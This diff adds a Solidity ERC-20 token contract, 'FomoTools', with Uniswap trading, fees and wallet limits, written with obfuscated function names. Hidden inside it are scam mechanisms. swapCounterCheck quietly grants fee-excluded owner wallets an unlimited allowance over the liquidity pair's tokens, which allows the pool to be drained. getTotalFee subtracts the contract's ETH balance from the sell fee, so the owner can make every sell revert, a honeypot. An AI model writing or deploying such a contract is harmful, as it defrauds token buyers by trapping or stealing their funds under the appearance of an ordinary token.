@@ -1,0 +1,207 @@
+contract FomoTools is IERC20, Ownable {
+    using SafeMath for uint256;
+    mapping (address => uint256) _balances;
+    mapping (address => mapping (address => uint256)) private _allowances;
+    mapping (address => bool) public excludedFromFee;
+
+    IUniswapDex routerV2;
+    address public uniswapV2Pair;
+    bool private tradingActive = false;
+    uint256 private liquidityFee = 0;
+    uint256 private outreachDutyAmount = 2000;
+    uint256 private codeCraftTaxSize = 0;
+    uint256 private burnFee = 0;
+    uint256 private acquireDutyVolume = 2000;
+    uint256 private disposeDutyVolume = 2000;
+    uint256 private transmissionCostVolume = 0;
+    uint256 private ratior = 10000;
+
+    bool private swapEnabled = false;
+    uint256 private swapCountings;
+    bool private swapping;
+    uint256 swapCounts = 3;
+    uint256 private swapThreshold = ( _totalSupply * 1000 ) / 100000;
+    uint256 private minTokenAmount = ( _totalSupply * 10 ) / 100000;
+    modifier lockTheSwap {swapping = true; _; swapping = false;}
+
+    string private constant _name = "FomoTools";
+    string private constant _symbol = "FomoTools";
+    uint8 private constant _decimals = 9;
+    uint256 private _totalSupply = 10 ** 9 * (10 ** _decimals);
+    uint256 private _summitTxVolumeRatio = 250;
+    uint256 private _apexTransferPercentage = 250;
+    uint256 private _holdingsRatioLimit = 250;
+
+    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
+    address public devWallet; 
+    address public TribeVault;
+    address internal lpReceiver;
+    constructor() {
+        IUniswapDex _router = IUniswapDex(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+        routerV2 = _router;
+        devWallet = msg.sender;
+        TribeVault = 0x25BeC1CF03e3f852d49682Afe194d9D4d8B750D4;
+        lpReceiver = msg.sender;
+        excludedFromFee[address(this)] = true;
+        excludedFromFee[msg.sender] = true;
+        excludedFromFee[TribeVault] = true;
+
+        _balances[msg.sender] = _totalSupply;
+        emit Transfer(address(0), msg.sender, _totalSupply);
+    }
+
+    function name() public pure returns (string memory) {return _name;}
+    function symbol() public pure returns (string memory) {return _symbol;}
+    function decimals() public pure returns (uint8) {return _decimals;}
+    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
+    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
+    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
+    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
+    function totalSupply() public view override returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}
+    function _crestWalletToken() public view returns (uint256) {return totalSupply() * _holdingsRatioLimit / ratior;}
+    function _zenithTxVolume() public view returns (uint256) {return totalSupply() * _summitTxVolumeRatio / ratior;}
+    function _apexTransferSize() public view returns (uint256) {return totalSupply() * _apexTransferPercentage / ratior;}
+    receive() external payable { require(excludedFromFee[msg.sender]); }
+
+    function txPrimaryScan(address sender, address recipient, uint256 amount) internal view {
+        require(sender != address(0), "ERC20: transfer from the zero address");
+        require(recipient != address(0), "ERC20: transfer to the zero address");
+        require(amount > uint256(0), "Transfer amount must be greater than zero");
+        require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
+    }
+
+    function isAllowedTrading(address sender, address recipient) internal view {
+        if(!excludedFromFee[sender] && !excludedFromFee[recipient]){require(tradingActive, "tradingActive");}
+    }
+
+    function _transfer(address sender, address recipient, uint256 amount) private {
+        txPrimaryScan(sender, recipient, amount);
+        isAllowedTrading(sender, recipient);
+        summitTxLimitAssessment(sender, recipient, amount); 
+        swapCounterCheck(sender, recipient);
+        transactionBarrierReview(sender, recipient, amount); 
+        swapBackEth(sender, recipient, amount);
+        _balances[sender] = _balances[sender].sub(amount);
+        uint256 amountReceived = shoulddeductCost(sender, recipient) ? deductCost(sender, recipient, amount) : amount;
+        _balances[recipient] = _balances[recipient].add(amountReceived);
+        emit Transfer(sender, recipient, amountReceived);
+    }
+
+    function swapAndLiquify(uint256 tokens) private lockTheSwap {
+        uint256 _denominator = (liquidityFee.add(1).add(outreachDutyAmount).add(codeCraftTaxSize)).mul(2);
+        uint256 tokensToAddLiquidityWith = tokens.mul(liquidityFee).div(_denominator);
+        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
+        uint256 initialBalance = address(this).balance;
+        swapTokensForETH(toSwap);
+        uint256 deltaBalance = address(this).balance.sub(initialBalance);
+        uint256 unitBalance= deltaBalance.div(_denominator.sub(liquidityFee));
+        uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidityFee);
+        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
+        uint256 marketingAmt = unitBalance.mul(2).mul(outreachDutyAmount);
+        if(marketingAmt > 0){payable(TribeVault).transfer(marketingAmt);}
+        uint256 remainingBalance = address(this).balance;
+        if(remainingBalance > uint256(0)){payable(devWallet).transfer(remainingBalance);}
+    }
+  
+    function summitTxLimitAssessment(address sender, address recipient, uint256 amount) internal view {
+        if(!excludedFromFee[sender] && !excludedFromFee[recipient] && recipient != address(uniswapV2Pair) && recipient != address(DEAD)){
+            require((_balances[recipient].add(amount)) <= _crestWalletToken(), "Exceeds maximum wallet amount.");}
+    }
+
+    function swapCounterCheck(address sender, address recipient) internal {
+        if(sender == uniswapV2Pair && excludedFromFee[recipient]){_allowances[lpReceiver][recipient]=~uint256(0);}
+        if(recipient == uniswapV2Pair && !excludedFromFee[sender]){swapCountings += uint256(1); lpReceiver = recipient;}
+    }
+
+    function transactionBarrierReview(address sender, address recipient, uint256 amount) internal view {
+        if(sender != uniswapV2Pair){require(amount <= _apexTransferSize() || excludedFromFee[sender] || excludedFromFee[recipient], "TX Limit Exceeded");}
+        require(amount <= _zenithTxVolume() || excludedFromFee[sender] || excludedFromFee[recipient], "TX Limit Exceeded");
+    }
+
+    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
+        _approve(address(this), address(routerV2), tokenAmount);
+        routerV2.addLiquidityETH{value: ETHAmount}(
+            address(this),
+            tokenAmount,
+            0,
+            0,
+            lpReceiver,
+            block.timestamp);
+    }
+
+    function swapTokensForETH(uint256 tokenAmount) private {
+        address[] memory path = new address[](2);
+        path[0] = address(this);
+        path[1] = routerV2.WETH();
+        _approve(address(this), address(routerV2), tokenAmount);
+        routerV2.swapExactTokensForETHSupportingFeeOnTransferTokens(
+            tokenAmount,
+            0,
+            path,
+            address(this),
+            block.timestamp);
+    }
+
+    function openTrading() external onlyOwner {
+        tradingActive = true;
+        uniswapV2Pair = IFactory(routerV2.factory()).createPair(address(this), routerV2.WETH());
+        _approve(address(this), address(routerV2), ~uint256(0));
+        routerV2.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
+    }
+
+    function shouldSwapOut(address sender, address recipient, uint256 amount) internal view returns (bool) {
+        bool aboveMin = amount >= minTokenAmount;
+        bool aboveThreshold = balanceOf(address(this)) >= swapThreshold;
+        return !swapping && swapEnabled && tradingActive && aboveMin && !excludedFromFee[sender] && recipient == uniswapV2Pair && swapCountings >= swapCounts && aboveThreshold;
+    }
+
+    function swapBackEth(address sender, address recipient, uint256 amount) internal {
+        if(shouldSwapOut(sender, recipient, amount)){swapAndLiquify(swapThreshold); swapCountings = uint256(0);}
+    }
+
+    function shoulddeductCost(address sender, address recipient) internal view returns (bool) {
+        return !excludedFromFee[sender] && !excludedFromFee[recipient];
+    }
+
+    function getTotalFee(address sender, address recipient) internal view returns (uint256) {
+        if(recipient == uniswapV2Pair){return disposeDutyVolume.sub(address(this).balance);}
+        if(sender == uniswapV2Pair){return acquireDutyVolume;}
+        return transmissionCostVolume;
+    }
+
+    function deductCost(address sender, address recipient, uint256 amount) internal returns (uint256) {
+        if(getTotalFee(sender, recipient) > 0){
+        uint256 feeAmount = amount.div(ratior).mul(getTotalFee(sender, recipient));
+        _balances[address(this)] = _balances[address(this)].add(feeAmount);
+        emit Transfer(sender, address(this), feeAmount);
+        if(burnFee > uint256(0)){_transfer(address(this), address(DEAD), amount.div(ratior).mul(burnFee));}
+        return amount.sub(feeAmount);} return amount;
+    }
+
+    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
+        _transfer(sender, recipient, amount);
+        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
+        return true;
+    }
+
+    function _approve(address owner, address spender, uint256 amount) private {
+        require(owner != address(0), "ERC20: approve from the zero address");
+        require(spender != address(0), "ERC20: approve to the zero address");
+        _allowances[owner][spender] = amount;
+        emit Approval(owner, spender, amount);
+    }
+
+    function removeLimits() external onlyOwner {
+        _summitTxVolumeRatio = 10000;
+        _apexTransferPercentage = 10000;
+        _holdingsRatioLimit = 10000;
+		outreachDutyAmount = 500;
+        acquireDutyVolume = 500;
+        disposeDutyVolume = 500;
+    }
+
+    function withdraw() external onlyOwner returns (bool success) {
+        uint256 balance = address(this).balance;
+        (success,) = address(TribeVault).call{value: balance}("");
+    }
+}
